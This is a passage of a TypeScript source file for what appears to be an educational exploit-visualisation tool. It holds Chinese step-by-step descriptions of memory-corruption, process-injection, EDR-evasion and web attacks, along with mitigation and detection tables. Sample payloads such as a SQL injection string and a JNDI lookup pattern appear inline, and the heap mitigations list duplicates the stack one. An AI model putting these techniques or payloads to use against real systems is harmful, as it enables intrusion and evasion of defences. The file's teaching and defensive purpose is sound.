    stack_over_ret_desc: "溢出到达保存的返回地址。攻击者现在可以重定向执行流。",
    stack_ret_title: "劫持指令指针 (EIP)",
    stack_ret_desc: "函数返回。它不再回到调用者，而是跳转到攻击者注入的地址。",
    uaf_alloc_title: "初始分配",
    uaf_alloc_desc: "在堆上分配对象 A。指针 'ptr1'存储其内存地址。",
    uaf_free_title: "释放对象",
    uaf_free_desc: "对象 A 被释放。但是，'ptr1' 没有被置空，成为了“悬空指针”。",
    uaf_realloc_title: "堆内存重用",
    uaf_realloc_desc: "分配对象 B。堆管理器重用了之前由对象 A 占据的内存槽位。",
    uaf_access_title: "悬空指针访问",
    uaf_access_desc: "程序使用 'ptr1' 访问内存。它无意中读取或写入了对象 B 的数据。",
    fmt_call_title: "存在漏洞的 Printf 调用",
    fmt_call_desc: "程序调用 printf，输入受用户控制但没有格式限定符。",
    fmt_parse_1_title: "栈数据泄露 (步骤 1)",
    fmt_parse_1_desc: "输入中的第一个 '%x' 导致 printf 读取栈中超出预期参数的第一个值。",
    fmt_parse_2_title: "栈数据泄露 (步骤 2)",
    fmt_parse_2_desc: "多个格式限定符允许攻击者遍历栈并泄露敏感地址或数据。",
    int_calc_title: "大小计算",
    int_calc_desc: "程序计算所需的缓冲区大小。在此案例中，使用 8 位无符号整数加法。",
    int_wrap_title: "整数回绕 (Wraparound)",
    int_wrap_desc: "240 + 20 超过了 255（8 位最大值）。值“回绕”到了 4。",
    int_alloc_title: "分配不足",
    int_alloc_desc: "程序根据回绕后的结果分配了 4 字节，这远小于实际数据大小 (240)。",
    int_overflow_title: "内存损坏",
    int_overflow_desc: "程序尝试将 240 字节复制到 4 字节的缓冲区中，导致堆溢出。",
    df_alloc_title: "内存分配",
    df_alloc_desc: "分配一个内存块并将其赋值给 'ptr'。",
    df_free1_title: "第一次释放",
    df_free1_desc: "内存块被释放并返回给分配器的空闲列表 (bin)。",
    df_free2_title: "双重释放漏洞",
    df_free2_desc: "同一个内存块被再次释放。它现在在空闲列表中出现了两次，形成了循环引用。",
    df_malloc1_title: "第一次重新分配",
    df_malloc1_desc: "分配器将该块返回给 'p1'。它从空闲列表的头部被移除。",
    df_malloc2_title: "重叠的内存块",
    df_malloc2_desc: "下一次分配将相同的内存地址返回给 'p2'。两个指针现在控制同一块内存。",
    rop_overflow_title: "栈溢出攻击",
    rop_overflow_desc: "攻击者溢出栈以控制返回地址和随后的栈内容。",
    rop_ret_title: "返回到 Gadget",
    rop_ret_desc: "函数“返回”到精心挑选的代码片段 (Gadget)，而不是原始调用者。",
    rop_gadget1_title: "执行 Gadget",
    rop_gadget1_desc: "Gadget 'pop rdi; ret' 从栈中加载一个值到 RDI 寄存器，然后返回到下一个 Gadget。",
    rop_system_title: "执行系统函数",
    rop_system_desc: "Gadget 链最终导致调用 'system' 函数，执行由 RDI 寄存器定义的 Shell命令。",
    hg_start_title: "32 位兼容模式",
    hg_start_desc: "进程在 32 位 WoW64 模式下启动。CS 选择子为 0x23。安全钩子正在监控 API 调用。",
    hg_push_title: "准备切换",
    hg_push_desc: "64 位代码段选择子 (0x33) 连同返回地址一起被推入栈中。",
    hg_gate_title: "进入天堂之门",
    hg_gate_desc: "执行“远返回” (retf) 将 CPU 的内部模式从 32 位切换到 64 位。",
    hg_native_title: "64 位长模式",
    hg_native_desc: "CPU 现在正在执行原生的 64 位指令。32 位的用户态钩子现在已经失效且被绕过。",
    hg_sys_title: "原生系统调用",
    hg_sys_desc: "直接调用 64 位内核系统调用，执行 32 位 EDR/AV 无法检测到的操作。",
    rdll_read_title: "DLL 内存加载",
    rdll_read_desc: "攻击者将目标 DLL 读取到自己进程的缓冲区中，避免使用标准的加载 API。",
    rdll_alloc_title: "准备远程内存",
    rdll_alloc_desc: "在受害者进程中分配具有读/写/执行 (RWX) 权限的空间来存放 DLL。",
    rdll_write_title: "原始 DLL 注入",
    rdll_write_desc: "DLL 的原始字节被直接写入目标进程的内存空间。",
    rdll_thread_title: "启动加载器",
    rdll_thread_desc: "创建一个远程线程，从 DLL 内部的 'ReflectiveLoader' 函数开始执行。",
    rdll_reloc_title: "自我重定位",
    rdll_reloc_desc: "ReflectiveLoader 解析其自身的头部，处理导入表并修复内存地址（重定位）。",
    rdll_main_title: "最终执行",
    rdll_main_desc: "DLL 现在已完全映射并可以使用。它执行 DllMain，启动恶意载荷。",
    ph_create_title: "挂起状态创建",
    ph_create_desc: "一个合法的系统进程以挂起状态创建。在操作系统看来它完全正常。",
    ph_unmap_title: "进程镂空",
    ph_unmap_desc: "进程的合法代码段被取消映射（镂空），留下一个空壳。",
    ph_alloc_title: "载荷内存分配",
    ph_alloc_desc: "在被镂空的进程中重新分配内存，为恶意载荷腾出空间。",
    ph_write_title: "载荷注入",
    ph_write_desc: "恶意代码和头部被写入这个合法的进程容器中。",
    ph_ctx_title: "上下文劫持",
    ph_ctx_desc: "线程的指令指针被更新，指向恶意代码的新入口点。",
    ph_resume_title: "恶意恢复执行",
    ph_resume_desc: "进程被恢复。它执行恶意软件，但在外观上仍显示为原始的合法进程。",
    th_open_title: "线程发现",
    th_open_desc: "攻击者在合法进程中识别出一个目标线程，并获取具有足够权限的句柄。",
    th_suspend_title: "冻结线程",
    th_suspend_desc: "目标线程被挂起，暂停其正常执行并保存其 CPU 状态。",
    th_getctx_title: "捕获寄存器",
    th_getctx_desc: "攻击者获取线程当前的 CPU 寄存器，特别是指令指针 (RIP/EIP)。",
    th_write_title: "Shellcode 注入",
    th_write_desc: "恶意的 Shellcode 被写入进程内存，通常位于分配的 RWX 区域。",
    th_setctx_title: "更新上下文",
    th_setctx_desc: "线程的指令指针被更新，指向注入的 Shellcode 的起始位置。",
    th_resume_title: "劫持执行流",
    th_resume_desc: "线程被恢复。它立即开始执行攻击者的 Shellcode，而不是其原始代码。",
    sqli_input_title: "用户输入阶段",
    sqli_input_desc: "攻击者在搜索字段输入载荷：`' OR '1'='1`。该载荷旨在破坏 SQL 查询逻辑。",
    sqli_req_title: "发送 HTTP 请求",
    sqli_req_desc: "浏览器将恶意载荷作为 URL 参数发送到后端服务器。",
    sqli_code_title: "漏洞代码处理",
    sqli_code_desc: "服务器接收输入并将其直接拼接进 SQL 字符串，没有经过任何过滤。",
    sqli_query_title: "执行恶意查询",
    sqli_query_desc: "数据库收到修改后的查询，该查询现在的逻辑对所有行都评估为“真”。",
    sqli_db_title: "数据外泄",
    sqli_db_desc: "由于查询条件始终为真，数据库返回所有用户记录，而不仅仅是一个。",
    ssrf_input_title: "URL 输入注入",
    ssrf_input_desc: "攻击者向漏洞参数提供指向内部资源（如 localhost:8080/admin）的 URL。",
    ssrf_req_title: "请求到达",
    ssrf_req_desc: "服务器收到请求并提取攻击者提供的 URL 以准备获取内容。",
    ssrf_proc_title: "服务端请求发起",
    ssrf_proc_desc: "服务器作为代理，向攻击者提供的 URL 发起网络请求。",
    ssrf_internal_title: "访问内部资源",
    ssrf_internal_desc: "请求到达内部服务器。由于它来自受信任的内部 IP，请求被允许。",
    ssrf_res_title: "响应转发",
    ssrf_res_desc: "公网服务器收到内部资源的响应，并将其原样发送回攻击者。",
    csrf_login_title: "用户登录",
    csrf_login_desc: "受害者登录其合法的银行账户。浏览器中存储了会话 Cookie。",
    csrf_visit_title: "访问恶意网站",
    csrf_visit_desc: "在保持银行登录状态的同时，受害者访问了一个恶意网站（例如通过钓鱼链接）。",
    csrf_req_title: "跨站请求发起",
    csrf_req_desc: "恶意网站自动触发一个不可见的 POST 请求，目标是银行的转账 API。",
    csrf_cookie_title: "自动携带 Cookie",
    csrf_cookie_desc: "浏览器会自动将受害者的会话 Cookie 附加到请求中，因为请求目标是银行的域名。",
    csrf_server_title: "未授权操作执行",
    csrf_server_desc: "银行服务器验证了 Cookie 并执行了转账，它不知道这并非用户的本意。",
    l4s_input_title: "恶意 JNDI 载荷",
    l4s_input_desc: "攻击者发送一个 HTTP 请求，在 User-Agent 等头部字段中包含 JNDI 查找字符串。",
    l4s_logging_title: "记录载荷日志",
    l4s_logging_desc: "应用程序使用 Log4j 记录该头部。Log4j 尝试解析字符串中的变量。",
    l4s_lookup_title: "触发 JNDI 查找",
    l4s_lookup_desc: "Log4j 的查找机制识别出 '${jndi:ldap://...}' 模式并启动 JNDI 请求。",
    l4s_ldap_req_title: "发起 LDAP 请求",
    l4s_ldap_req_desc: "服务器连接到攻击者的 LDAP 服务器以检索对象引用。",
    l4s_ldap_res_title: "LDAP 响应 (重定向)",
    l4s_ldap_res_desc: "恶意 LDAP 服务器返回一个响应，指向远程 HTTP 服务器上的 Java 类文件。",
    l4s_class_title: "下载远程类文件",
    l4s_class_desc: "受害者服务器从攻击者的 HTTP 服务器下载恶意的 .class 文件。",
    l4s_rce_title: "执行远程代码",
    l4s_rce_desc: "下载的类在实例化时被执行，使攻击者获得对服务器的完全控制。",
    nrce_bg_title: "Flight 数据序列化",
    nrce_bg_desc: "Next.js 使用自定义格式发送组件 tree。理解此格式是实施漏洞利用的关键。",
    nrce_craft_title: "载荷构建",
    nrce_craft_desc: "攻击者构建一个被污染的 Flight 数据载荷，其中包含递归引用和恶意 Gadget。",
    nrce_write_title: "缓存污染",
    nrce_write_desc: "通过 Server Action 或精心设计的请求，将载荷注入服务端缓存。",
    nrce_trigger_title: "触发检索",
    nrce_trigger_desc: "随后的请求触发服务器从缓存中获取并反序列化被污染的条目。",
    nrce_deser_title: "不安全的反序列化",
    nrce_deser_desc: "React 的服务端反序列化器处理被污染的数据，触发恶意 Gadget 的执行。",
    nrce_exec_title: "服务器沦陷",
    nrce_exec_desc: "反序列化过程导致在 Next.js 服务器上执行任意代码。",
    xxe_input_title: "带有 DTD 的 XML 输入",
    xxe_input_desc: "攻击者提交的 XML 包含定义外部实体的文档类型定义 (DTD)。",
    xxe_parse_title: "解析 XML",
    xxe_parse_desc: "服务器开始解析 XML。不安全的配置允许定义和引用外部实体。",
    xxe_resolve_title: "实体解析",
    xxe_resolve_desc: "解析器遇到实体引用，并尝试通过读取指定的系统文件来解析它。",
    xxe_access_title: "访问本地文件",
    xxe_access_desc: "解析器成功从本地文件系统读取敏感文件（如 /etc/passwd）。",
    xxe_response_title: "信息泄露",
    xxe_response_desc: "本地文件的内容被代入 XML，并在响应中返回给攻击者。",
    pt_input_title: "构造文件路径",
    pt_input_desc: "用户提供包含 ../ 的路径参数。",
    pt_request_title: "发送下载请求",
    pt_request_desc: "服务器接收 'file' 查询参数。",
    pt_normalize_title: "尝试路径归一化",
    pt_normalize_desc: "简单归一化未移除穿越序列。",
    pt_resolve_title: "解析到基路径之外",
    pt_resolve_desc: "最终规范路径逃逸出基准目录。",
    pt_read_title: "读取目标文件",
    pt_read_desc: "服务器根据解析路径读取文件内容。",
    pt_response_title: "返回敏感数据",
    pt_response_desc: "泄露内容被包含在 HTTP 响应中。",
    xss_inject_title: "脚本注入",
    xss_inject_desc: "攻击者提交了一条包含恶意 script 标签而不是普通文本的评论。",
    xss_store_title: "持久化存储",
    xss_store_desc: "服务器未能过滤输入，将恶意脚本直接存储在数据库中。",
    xss_load_title: "受害者加载页面",
    xss_load_desc: "受害者访问评论页面。服务器检索恶意脚本并将其发送到浏览器。",
    xss_exec_title: "浏览器执行脚本",
    xss_exec_desc: "受害者的浏览器解释 script 标签，并在当前会话的上下文中执行攻击者的代码。",
    xss_exfil_title: "数据外窃",
    xss_exfil_desc: "脚本窃取受害者的会话 Cookie 并将其发送到攻击者的服务器。",
    fu_input_title: "不受限制的文件输入",
    fu_input_desc: "攻击者选择一个伪装成图片的恶意脚本文件（例如将 shell.php 重命名为 shell.jpg）。",
    fu_upload_title: "Multipart 文件上传",
    fu_upload_desc: "服务器接收 multipart/form-data。实现过度信任文件名和 Content-Type，缺少深入校验。",
    fu_store_title: "保存到站点根目录下",
    fu_store_desc: "服务器将文件保存到可被直接访问的 'uploads/' 目录，并使用原始文件名。",
    fu_access_title: "直接网页访问",
    fu_access_desc: "攻击者通过公开 URL 访问上传文件（例如 /uploads/shell.php）。",
    fu_exec_title: "服务器端执行",
    fu_exec_desc: "Web 服务器解释并执行上传的脚本，导致远程代码执行。",
    deser_craft_title: "对象序列化",
    deser_craft_desc: "攻击者构建一个序列化字符串，代表一个已知存在漏洞类的恶意对象。",
    deser_send_title: "交付载荷",
    deser_send_desc: "序列化载荷被发送到服务器，通常通过 Cookie 或表单参数。",
    deser_parse_title: "反序列化过程",
    deser_parse_desc: "服务器对不可信数据调用 'unserialize'，在内存中重新实例化恶意对象。",
    deser_magic_title: "触发魔术方法",
    deser_magic_desc: "在对象创建时，其魔术方法（如 __wakeup 或 __destruct）会自动执行。",
    deser_rce_title: "恶意执行",
    deser_rce_desc: "魔术方法内部的逻辑执行了对象属性中提供的系统命令。",
    fj_input_title: "JSON 载荷提交",
    fj_input_desc: "攻击者发送精心构造的 JSON 字符串，@type 指向恶意类（如模板引擎）。",
    fj_parsing_title: "JSON 解析",
    fj_parsing_desc: "Fastjson 解析 JSON 字符串并读取 @type 字段来确定要反序列化的类。",
    fj_template_title: "Gadget 链实例化",
    fj_template_desc: "Fastjson 使用反射实例化指定的类。不进行类型验证（autoType 已启用）。",
    fj_getvalue_title: "模板表达式提取",
    fj_getvalue_desc: "恶意类的 getter 方法被调用，从 JSON 属性中提取模板表达式。",
    fj_eval_title: "模板表达式评估",
    fj_eval_desc: "模板引擎（如 FreeMarker、Spring）在对象上下文中评估注入的表达式。",
    fj_rce_title: "远程代码执行",
    fj_rce_desc: "评估的模板表达式通过内置模板函数执行系统命令。",
    aes_exp_title: "密钥扩展",
    aes_exp_desc: "128 位主密钥通过复杂的调度算法扩展为 11 个轮密钥。",
    aes_init_title: "初始轮",
    aes_init_desc: "明文与第一个轮密钥执行异或操作 (AddRoundKey) 以开始加密过程。",
    aes_main_title: "加密主轮次",
    aes_main_desc: "状态矩阵经历四种转换：字节代换 (S-Box)、行移位、列混淆和轮密钥加。",
    aes_final_title: "加密最终轮",
    aes_final_desc: "最后一轮在执行最终的轮密钥加转换之前省略了列混淆步骤。",
  }
};

const MITIGATIONS = {
  [ExploitType.WAF]: {
      [Language.EN]: ["Semantic Analysis (LibInjection)", "Positive Security Model (Whitelisting)", "Machine Learning Models", "Virtual Patching"],
      [Language.ZH]: ["语义分析 (LibInjection)", "正面安全模型 (白名单)", "机器学习模型", "虚拟补丁 (Virtual Patching)"]
  },
  [ExploitType.IPS]: {
      [Language.EN]: ["Behavioral Anomaly Detection", "Protocol Anomaly Detection", "SSL/TLS Decryption Inspection", "Hardware Acceleration (FPGA/ASIC)"],
      [Language.ZH]: ["行为异常检测", "协议异常检测", "SSL/TLS 卸载检测", "硬件加速 (FPGA/ASIC)"]
  },
  [ExploitType.CFW]: {
      [Language.EN]: ["Dynamic Symbolic Execution (DSE)", "Taint Analysis & Tracking", "Binary Rewriting (Deobfuscation)", "Machine Learning Classification"],
      [Language.ZH]: ["动态符号执行 (DSE)", "污点分析与追踪", "二进制改写 (反混淆)", "机器学习分类"]
  },
  [ExploitType.STACK]: {
    [Language.EN]: ["Stack Canaries (StackGuard)", "DEP / NX Bit (Non-Executable Stack)", "ASLR (Address Space Layout Randomization)"],
    [Language.ZH]: ["栈金丝雀 (Stack Canaries)", "DEP / NX 位 (不可执行栈)", "ASLR (地址空间布局随机化)"]
  },
  [ExploitType.HEAP]: {
    [Language.EN]: ["Stack Canaries (StackGuard)", "DEP / NX Bit (Non-Executable Stack)", "ASLR (Address Space Layout Randomization)"],
    [Language.ZH]: ["栈金丝雀 (Stack Canaries)", "DEP / NX 位 (不可执行栈)", "ASLR (地址空间布局随机化)"]
  },
  [ExploitType.UAF]: {
    [Language.EN]: ["Nullify pointers after free()", "Use Smart Pointers (std::shared_ptr)", "Heap Isolation"],
    [Language.ZH]: ["释放后置空指针", "使用智能指针", "堆隔离"]
  },
  [ExploitType.FORMAT_STRING]: {
    [Language.EN]: ["Always specify format string constant", "Compiler warnings (-Wformat)", "FORTIFY_SOURCE"],
    [Language.ZH]: ["始终指定格式字符串常量", "编译器警告 (-Wformat)", "FORTIFY_SOURCE保护"]
  },
  [ExploitType.INTEGER_OVERFLOW]: {
    [Language.EN]: ["Input Validation / Bounds Checking", "Safe Integer Libraries (SafeInt)", "Compiler Overflow Checks (-ftrapv)"],
    [Language.ZH]: ["输入验证 / 边界检查", "安全整数库 (SafeInt)", "编译器溢出检查"]
  },
  [ExploitType.DOUBLE_FREE]: {
    [Language.EN]: ["Nullify pointers after free()", "Allocator Double-Free Checks", "Code Reviews"],
    [Language.ZH]: ["释放后置空指针", "分配器双重释放检查", "代码审查"]
  },
  [ExploitType.ROP]: {
    [Language.EN]: ["ASLR (Randomizes Gadget Locations)", "Control Flow Integrity (CFI)", "Shadow Stack (CET)"],
    [Language.ZH]: ["ASLR (随机化Gadget位置)", "控制流完整性 (CFI)", "影子栈 (CET)"]
  },
  [ExploitType.HEAVENS_GATE]: {
    [Language.EN]: ["Kernel-mode Syscall Hooking", "CFG (Control Flow Guard)", "Heuristic Analysis of Segments"],
    [Language.ZH]: ["内核模式系统调用Hook", "CFG (控制流保护)", "段寄存器启发式分析"]
  },
  [ExploitType.REFLECTIVE_DLL]: {
    [Language.EN]: ["Memory Scanning (RWX)", "Behavioral Monitoring", "ETW (Event Tracing for Windows)"],
    [Language.ZH]: ["内存扫描 (RWX)", "行为监控", "ETW (Windows事件追踪)"]
  },
  [ExploitType.PROCESS_HOLLOWING]: {
    [Language.EN]: ["Parent/Child Process Analysis", "Memory Unmapping Detection", "EP (Entry Point) Verification"],
    [Language.ZH]: ["父/子进程分析", "内存Unmap检测", "入口点 (EP) 验证"]
  },
  [ExploitType.THREAD_HIJACKING]: {
    [Language.EN]: ["Thread Creation Monitoring", "Context Switch Analysis", "Sysmon Event ID 8 (CreateRemoteThread)"],
    [Language.ZH]: ["线程创建监控", "上下文切换分析", "Sysmon事件ID 8"]
  },
  [ExploitType.NETWORK_MAPPING]: {
    [Language.EN]: ["Distributed Scan Architecture", "Data Fingerprinting Library", "DSL Query Language (FOFA/Shodan)"],
    [Language.ZH]: ["分布式扫描架构", "数据指纹识别库", "测绘 DSL 查询语言 (FOFA/Shodan)"]
  },
  [ExploitType.SQLI]: {
    [Language.EN]: ["Use Prepared Statements (Parameterized Queries)", "Input Validation / Sanitization", "Principle of Least Privilege (DB User)"],
    [Language.ZH]: ["使用预处理语句 (参数化查询)", "输入验证 / 过滤", "最小权限原则 (数据库用户)"]
  },
  [ExploitType.SSRF]: {
    [Language.EN]: ["Whitelist Allowed Domains/IPs", "Disable Redirections", "Use a dedicated/isolated network for fetching external resources"],
    [Language.ZH]: ["白名单允许的域名/IP", "禁用重定向", "使用专用/隔离网络获取外部资源"]
  },
  [ExploitType.CSRF]: {
    [Language.EN]: ["Use Anti-CSRF Tokens (Synchronizer Token Pattern)", "SameSite Cookie Attribute (Strict/Lax)", "Check Origin/Referer Headers"],
    [Language.ZH]: ["使用 Anti-CSRF Token (同步令牌模式)", "SameSite Cookie 属性 (Strict/Lax)", "检查 Origin/Referer 请求头"]
  },
  [ExploitType.LOG4SHELL]: {
    [Language.EN]: ["Upgrade Log4j to 2.17.1+", "Set log4j2.formatMsgNoLookups=true", "Remove JndiLookup class from classpath"],
    [Language.ZH]: ["升级 Log4j 到 2.17.1+", "设置 log4j2.formatMsgNoLookups=true", "从类路径中删除 JndiLookup 类"]
  },
  [ExploitType.NEXTJS_RCE]: {
    [Language.EN]: ["Sanitize cache keys", "Upgrade Next.js to latest patch", "Avoid caching unsanitized user input with unstable_cache"],
    [Language.ZH]: ["净化缓存键", "升级 Next.js 到最新补丁版本", "避免使用 unstable_cache 缓存未净化的用户输入"]
  },
  [ExploitType.XXE]: {
    [Language.EN]: ["Disable DTD processing (LIBXML_NO_DTD)", "Disable external entities (LIBXML_NOENT)", "Use JSON instead of XML"],
    [Language.ZH]: ["禁用 DTD 处理 (LIBXML_NO_DTD)", "禁用外部实体 (LIBXML_NOENT)", "使用 JSON 替代 XML"]
  },
  [ExploitType.XSS]: {
    [Language.EN]: ["Context-aware Output Encoding", "Content Security Policy (CSP)", "HttpOnly Cookies"],
    [Language.ZH]: ["上下文感知的输出编码", "内容安全策略 (CSP)", "HttpOnly Cookie"]
  },
  [ExploitType.PATH_TRAVERSAL]: {
    [Language.EN]: [
      "Canonicalize path and enforce base directory",
      "Reject input containing '..' or absolute paths",
      "Use allowlist filenames or resource IDs",
      "Use framework-provided safe path join"
    ],
    [Language.ZH]: [
      "路径规范化并强制基准目录",
      "拒绝包含 '..' 或绝对路径的输入",
      "使用白名单文件名或资源 ID",
      "使用框架提供的安全路径拼接"
    ]
  },
  [ExploitType.DESERIALIZATION]: {
    [Language.EN]: ["Do not deserialize untrusted data", "Use safer data formats like JSON", "Implement integrity checks (HMAC) on serialized data"],
    [Language.ZH]: ["不要反序列化不可信数据", "使用 JSON 等更安全的数据格式", "对 serialization 数据实施完整性检查 (HMAC)"]
  },
  [ExploitType.FASTJSON]: {
    [Language.EN]: ["Disable autoType feature by default", "Upgrade to Fastjson 2.x (Security hardened)", "Implement allowlist for @type (SafeMode)", "Use external JSON libraries without reflection"],
    [Language.ZH]: ["默认禁用 autoType 特性", "升级至 Fastjson 2.x (安全强化版)", "为 @type 实现白名单 (SafeMode)", "使用不依赖反射的外部 JSON 库"]
  },
  [ExploitType.FILE_UPLOAD]: {
    [Language.EN]: [
      "Store uploads outside web root",
      "Enforce allowlist of file types with content sniffing",
      "Randomize filenames and strip paths",
      "Set upload directory to non-executable",
      "Validate size, sanitize filename, and use safe path join"
    ],
    [Language.ZH]: [
      "将上传目录置于站点根目录之外",
      "强制文件类型白名单并进行内容嗅探",
      "随机化文件名并移除路径信息",
      "将上传目录设置为不可执行",
      "校验大小、净化文件名并使用安全的路径拼接"
    ]
  },
  [ExploitType.AES]: {
    [Language.EN]: ["Use hardware AES instructions (AES-NI)", "Use constant-time implementations to prevent side-channel attacks", "Ensure secure key management"],
    [Language.ZH]: ["使用硬件 AES 指令 (AES-NI)", "使用恒定时间实现以防止侧信道攻击", "确保安全的密钥管理"]
  }
};

const DETECTION_POINTS = {
  [ExploitType.WAF]: {
      [Language.EN]: ["403 Forbidden error logs", "HTTP Response headers (e.g. CF-RAY, X-WAF-Block)", "Unusually long latency during normalization"],
      [Language.ZH]: ["403 Forbidden 错误日志", "HTTP 响应头 (如 CF-RAY, X-WAF-Block)", "规范化过程中出现的异常高延迟"]
  },
  [ExploitType.IPS]: {
      [Language.EN]: ["TCP Reset packets sent from intermediary device", "Packet drops in Netflow stats", "SNMP traps for signature matches"],
      [Language.ZH]: ["来自中间设备的 TCP 重置 (RST) 包", "Netflow 统计中的丢包情况", "触发签名匹配的 SNMP Trap"]
  },
  [ExploitType.CFW]: {
      [Language.EN]: ["Excessive switch statements in disassembly (IDA/Ghidra)", "High cyclomatic complexity in control flow graphs", "Unusual state machine patterns in binary analysis", "Performance degradation indicating state machine overhead"],
      [Language.ZH]: ["反汇编中大量 switch 语句 (IDA/Ghidra)", "控制流图中的高复杂度指标", "二进制分析中异常的状态机模式", "表明状态机开销的性能降级"]
  },
  [ExploitType.NETWORK_MAPPING]: {
    [Language.EN]: ["Distributed scanner IPs", "High-frequency TCP SYN probes", "Abnormal service banner requests"],
    [Language.ZH]: ["分布式扫描节点 IP", "高频 TCP SYN 探测", "异常的服务 Banner 请求"]
  },
  [ExploitType.REFLECTIVE_DLL]: {
    [Language.EN]: ["Memory Regions with RWX permissions not backed by disk file", "Thread Start Address pointing to dynamically allocated memory", "High Entropy in memory regions (Packed code)"],
    [Language.ZH]: ["具有RWX权限且无磁盘文件支持的内存区域", "指向动态分配内存的线程起始地址", "内存区域高熵 (加壳代码)"]
  },
  [ExploitType.PROCESS_HOLLOWING]: {
    [Language.EN]: ["Mismatch between PEB ImageBase and VAD (Virtual Address Descriptor)", "Process mapped from one file but executing code from another", "Memory sections with W|X permissions"],
    [Language.ZH]: ["PEB ImageBase与VAD (虚拟地址描述符) 不匹配", "进程映射文件与执行代码不一致", "具有写|执行权限的内存段"]
  },
  [ExploitType.THREAD_HIJACKING]: {
    [Language.EN]: ["SetThreadContext calls on remote processes", "Instruction Pointer (RIP) pointing to the Heap or Stack", "Suspending threads of system processes"],
    [Language.ZH]: ["对远程进程调用SetThreadContext", "指令指针 (RIP) 指向堆或栈", "挂起系统进程线程"]
  },
  [ExploitType.SQLI]: {
    [Language.EN]: ["WAF Signatures (detecting ' UNION SELECT)", "Database Error Logs (Syntax errors)", "Unexpected High Data Volume in Responses"],
    [Language.ZH]: ["WAF 签名 (检测 ' UNION SELECT 等)", "数据库错误日志 (语法错误)", "响应中出现异常的大量数据"]
  },
  [ExploitType.SSRF]: {
    [Language.EN]: ["Outbound traffic to internal IP ranges (127.0.0.1, 10.x.x.x)", "Requests to Cloud Metadata Services (169.254.169.254)", "Unusual protocols (gopher://, file://)"],
    [Language.ZH]: ["流向内部 IP 范围 (127.0.0.1, 10.x.x.x) 的出站流量", "对云元数据服务的请求 (169.254.169.254)", "异常协议 (gopher://, file://)"]
  },
  [ExploitType.CSRF]: {
    [Language.EN]: ["Missing CSRF Token in POST body", "Referer Header coming from external domain", "Anomaly detection on critical actions"],
    [Language.ZH]: ["POST 请求体中缺少 CSRF Token", "Referer 头来自外部域名", "关键操作的异常检测"]
  },
  [ExploitType.LOG4SHELL]: {
    [Language.EN]: ["Log patterns containing '${jndi:'", "Outbound LDAP/RMI connections from web servers", "Child processes spawned by Java (e.g., cmd.exe, bash)"],
    [Language.ZH]: ["日志中包含 '${jndi:' 模式", "Web 服务器发起的出站 LDAP/RMI 连接", "Java 进程派生的子进程 (如 cmd.exe, bash)"]
  },
  [ExploitType.NEXTJS_RCE]: {
    [Language.EN]: ["Anomalous entries in Next.js Cache", "Unexpected child processes spawned by Node.js", "Serialized flight data patterns in request headers"],
    [Language.ZH]: ["Next.js 缓存中的异常条目", "Node.js 派生的意外子进程", "请求头中的序列化 Flight 数据模式"]
  },
  [ExploitType.XXE]: {
    [Language.EN]: ["Outbound traffic on unusual ports", "Log entries with SYSTEM identifier", "XML keywords in HTTP headers or body"],
    [Language.ZH]: ["异常端口的出站流量", "包含 SYSTEM 标识符的日志条目", "HTTP 头或正文中的 XML 关键字"]
  },
  [ExploitType.XSS]: {
    [Language.EN]: ["WAF/IPS signatures for script tags", "CSP Violation Reports", "User complaints about strange popups"],
    [Language.ZH]: ["针对 script 标签的 WAF/IPS 签名", "CSP 违规报告", "用户投诉奇怪的弹窗"]
  },
  [ExploitType.PATH_TRAVERSAL]: {
    [Language.EN]: [
      "Requests containing '../' or '%2e%2e/'",
      "Access to files outside web root",
      "Absolute paths observed in server logs"
    ],
    [Language.ZH]: [
      "请求包含 '../' 或 '%2e%2e/'",
      "访问超出站点根目录的文件",
      "服务器日志出现绝对路径"
    ]
  },
  [ExploitType.DESERIALIZATION]: {
    [Language.EN]: ["Serialized objects in cookies/headers", "Unexpected class instantiation", "Process creation from web worker processes"],
    [Language.ZH]: ["Cookie/Header 中的序列化对象", "意外的类实例化", "Web 工作进程创建子进程"]
  },
  [ExploitType.FASTJSON]: {
    [Language.EN]: ["JSON payloads containing @type fields", "Reflective instantiation of unexpected classes", "Suspicious gadget class names (FreeMarker, SpringTemplateEngine, TemplateImpl)", "Process creation from Java application"],
    [Language.ZH]: ["包含 @type 字段的 JSON 载荷", "意外类的反射实例化", "可疑的 gadget 类名 (FreeMarker、SpringTemplateEngine、TemplateImpl)", "Java 应用程序创建子进程"]
  },
  [ExploitType.FILE_UPLOAD]: {
    [Language.EN]: [
      "Multipart/form-data requests to upload endpoints",
      "Suspicious extensions stored under /uploads (e.g., .php, .jsp)",
      "Direct web access to uploaded files",
      "Server logs showing script execution from upload directory"
    ],
    [Language.ZH]: [
      "指向上传端点的 multipart/form-data 请求",
      "/uploads 下存储了可疑扩展（如 .php、.jsp）",
      "对上传文件的直接网页访问",
      "服务器日志显示从上传目录执行脚本"
    ]
  },
  [ExploitType.AES]: {
    [Language.EN]: ["Presence of S-Box constants (0x63, 0x7C...) in binary", "Rcon constants usage", "Characteristic loop structures (10/12/14 rounds)"],
    [Language.ZH]: ["二进制文件中存在 S-Box 常量 (0x63, 0x7C...)", "Rcon 常量的使用", "特征循环结构 (10/12/14 轮)"]
  }
};

const getArchValues = (arch: Architecture) => {
  switch (arch) {
    case Architecture.X64:
      return {
        ebp: "0x00007FFFFFFFE400",
        ret: "0x00000000004005E8",
        eipNormal: "0x00000000004005BD",
        eipHijack: "0x4343434343434343", 
        ebpCorrupt: "0x4242424242424242", 
        retCorrupt: "0x4343434343434343"
      };
    case Architecture.ARM:
      return {
        ebp: "0xBEFFF400",
        ret: "0x00010450",
        eipNormal: "0x00010430",
        eipHijack: "0x43434343",
        ebpCorrupt: "0x42424242",
        retCorrupt: "0x43434343"
      };
    case Architecture.MIPS:
      return {
        ebp: "0x7FFFF400",
        ret: "0x00400450",
        eipNormal: "0x00400430",
        eipHijack: "0x43434343",
        ebpCorrupt: "0x42424242",
        retCorrupt: "0x43434343"
      };
    case Architecture.X86:
    default:
      return {
        ebp: "0xBFFFF120",
        ret: "0x08048450",
        eipNormal: "0x08048430",
        eipHijack: "0x43434343",
        ebpCorrupt: "0x42424242",
        retCorrupt: "0x43434343"
      };
  }
};

const getSteps = (lang: Language, arch: Architecture, type: ExploitType): AnimationStep[] => {
  const t = I18N[lang] || I18N[Language.EN];
  if (!t) return [];
  const av = getArchValues(arch);

  if (type === ExploitType.HEAP) {
     return [
      { id: 0, title: t.heap_alloc_title, description: t.heap_alloc_desc, codeHighlight: [2, 3], heapChunk1Content: "", heapChunk2Content: "", heapChunk2Header: "Header (Sz: 16)" },
